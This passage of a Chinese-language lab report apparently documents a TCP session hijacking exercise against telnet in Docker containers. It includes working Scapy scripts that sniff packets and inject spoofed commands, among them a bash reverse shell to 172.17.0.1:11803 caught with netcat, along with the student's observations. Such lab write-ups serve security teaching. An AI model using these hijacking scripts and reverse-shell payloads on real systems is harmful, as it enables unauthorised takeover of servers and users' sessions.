  ip = IP(src="172.17.0.2", dst="172.17.0.3")
  tcp = TCP(sport=51768, dport=23, flags="A", seq=1356347600, ack=3083865505)
  data = "\r/bin/bash -i > /dev/tcp/172.17.0.1/11803 0<&1 2>&1\r"
  pkt = ip/tcp/data
  send(pkt, verbose=0)
  ```

- 在攻击机的`11803`端口开启监听：`nc -l 11803 -v`，然后使用程序`hijacking_manual_shell.py`进行攻击：`sudo python3 ./hijacking_manual_shell.py`

- 攻击后攻击机的`nc`即可获得服务机的`shell`，攻击成功
  ![3.4.5.攻击后攻击机的nc即可获得服务机的shell，攻击成功](https://raw.githubusercontent.com/BIIIANG/pic/main/202204121255948.png)

- `scapy`发送的攻击报文如下
  ![3.4.6.scapy发送的攻击报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204121255895.png)

- 追踪反向`shell`的`TCP`流如下，与攻击机发送的指令与结果相同
  ![3.4.7.追踪反向shell的TCP流](https://raw.githubusercontent.com/BIIIANG/pic/main/202204121255099.png)

- 观察和解释：你的攻击是否成功？你怎么知道它是否成功？你期待看到什么？你观察到了什么？观察结果是你预想的那样吗？

  - 攻击成功；
  - 用户机的`telnet`连接卡死、攻击机的`nc`获得服务机的`shell`且`Wireshark`拦截到相应的攻击报文和攻击机与服务机之间的`TCP`流数据；
  - 期待看到用户机的`telnet`连接卡死、攻击机的`nc`获得服务机的`shell`且`Wireshark`拦截到相应的攻击报文和攻击机与服务机之间的`TCP`流数据；
  - 观察到了用户机的`telnet`连接卡死、攻击机的`nc`获得服务机的`shell`且`Wireshark`拦截到相应的攻击报文和攻击机与服务机之间的`TCP`流数据；
  - 是。

## 3.5 用`scapy`自动攻击

### 3.5.1 普通命令

- 该攻击过程中的`Wireshark`数据见`3.5.利用scapy自动攻击.pcapng`

- 该部分使用`scapy`的嗅探功能自动拦截符合要求数据包并且构造相应的攻击报文，具体过程与手动攻击相似，拦截服务器发送给客户端的报文，从中提取源`IP`、源端口、目的`IP`、目的端口、窗口大小、`Ack`、`Seq`和`TCP`数据长度，从而构造攻击报文，自动攻击程序`hijacking_auto_simple.py`如下

  ```python
  #!/usr/bin/python3
  from scapy.all import *
  
  SRC  = "172.17.0.3"   # Server IP
  DST  = "172.17.0.2"   # Client IP
  PORT = 23             # Server telnet port
  
  def spoof(pkt):
      old_ip  = pkt[IP]
      old_tcp = pkt[TCP]
  
      #############################################
      ip = IP(src = old_ip.dst, dst = old_ip.src)
      tcp = TCP(sport = old_tcp.dport, dport = old_tcp.sport, seq = old_tcp.ack, ack = old_tcp.seq + len(old_tcp.payload), flags = "A")
      data = "\rls\r"
      #############################################
  
      pkt = ip/tcp/data
      send(pkt,verbose=0)
      ls(pkt)
      quit()
  
  f = 'tcp and src host {} and dst host {} and src port {}'.format(SRC, DST, PORT)
  sniff(filter=f, prn=spoof, iface="docker0")
  ```

- 首先使用户机使用`telnet`连接服务机，再在攻击机使用程序`hijcaking_auto_simple.py`进行攻击：`sudo python3 ./hijcaking_auto_simple.py`，为了激活攻击程序，在用户机的`telnet`中任意输入一个字符，可以观察到`scapy`发送了攻击报文
  ![3.5.1.scapy发送了攻击报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204121315647.png)

- `scapy`发送的攻击报文如下
  ![3.5.2.scapy发送的攻击报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204121315109.png)

- 服务机返回的报文（即指令的运行结果）如下
  ![3.5.3.服务机返回的报文（即指令的运行结果）](https://raw.githubusercontent.com/BIIIANG/pic/main/202204132041430.png)
  
- 观察和解释：你的攻击是否成功？你怎么知道它是否成功？你期待看到什么？你观察到了什么？观察结果是你预想的那样吗？

  - 攻击成功；
  - 用户机的`telnet`连接卡死且`Wireshark`拦截到相应的攻击报文和服务机返回的命令执行结果报文；
  - 期待看到用户机的`telnet`连接卡死且`Wireshark`拦截到相应的攻击报文和服务机返回的命令执行结果报文；
  - 观察到了用户机的`telnet`连接卡死且`Wireshark`拦截到相应的攻击报文和服务机返回的命令执行结果报文；
  - 是。
  
  

### 3.5.2 反向`shell`

- 该攻击过程中的`Wireshark`数据见`3.6.利用scapy自动攻击(反向shell).pcapng`

- 与`3.5.1 普通命令`方法相似，构造自动攻击程序`hijacking_auto_shell.py`如下

  ```python
  #!/usr/bin/python3
  from scapy.all import *
  
  SRC  = "172.17.0.3"   # Server IP
  DST  = "172.17.0.2"   # Client IP
  PORT = 23             # Server telnet port
  
  def spoof(pkt):
      old_ip  = pkt[IP]
      old_tcp = pkt[TCP]
  
      #############################################
      ip = IP(src = old_ip.dst, dst = old_ip.src)
      tcp = TCP(sport = old_tcp.dport, dport = old_tcp.sport, seq = old_tcp.ack, ack = old_tcp.seq + len(old_tcp.payload), flags = "A")
      data = "\r/bin/bash -i > /dev/tcp/172.17.0.1/11803 0<&1 2>&1\r"
      #############################################
  
      pkt = ip/tcp/data
      send(pkt,verbose=0)
      ls(pkt)
      quit()
  
  f = 'tcp and src host {} and dst host {} and src port {}'.format(SRC, DST, PORT)
  sniff(filter=f, prn=spoof, iface="docker0")
  ```

- 首先使用户机使用`telnet`连接服务机，在攻击机的`11803`端口开启监听：`nc -l 11803 -v`，再在攻击机使用程序`hijcaking_auto_shell.py`进行攻击：`sudo python3 ./hijcaking_auto_shell.py`，为了激活攻击程序，在用户机的`telnet`中任意输入一个字符，可以观察到`scapy`发送了攻击报文
  ![3.5.4.scapy发送了攻击报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204131958185.png)

- 攻击后攻击机的`nc`即可获得服务机的`shell`，攻击成功
  ![3.5.5.攻击后攻击机的nc即可获得服务机的shell，攻击成功](https://raw.githubusercontent.com/BIIIANG/pic/main/202204131958504.png)

- `scapy`发送的攻击报文如下
  ![3.5.6.scapy发送的攻击报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204131959369.png)

- 追踪反向`shell`的`TCP`流如下，与攻击机发送的指令与结果相同
  ![3.5.7.追踪反向shell的TCP流](https://raw.githubusercontent.com/BIIIANG/pic/main/202204131959340.png)
  
- 观察和解释：你的攻击是否成功？你怎么知道它是否成功？你期待看到什么？你观察到了什么？观察结果是你预想的那样吗？

  - 攻击成功；
  - 用户机的`telnet`连接卡死、攻击机的`nc`获得服务机的`shell`且`Wireshark`拦截到相应的攻击报文和攻击机与服务机之间的`TCP`流数据；
  - 期待看到用户机的`telnet`连接卡死、攻击机的`nc`获得服务机的`shell`且`Wireshark`拦截到相应的攻击报文和攻击机与服务机之间的`TCP`流数据；
  - 观察到了用户机的`telnet`连接卡死、攻击机的`nc`获得服务机的`shell`且`Wireshark`拦截到相应的攻击报文和攻击机与服务机之间的`TCP`流数据；
  - 是。





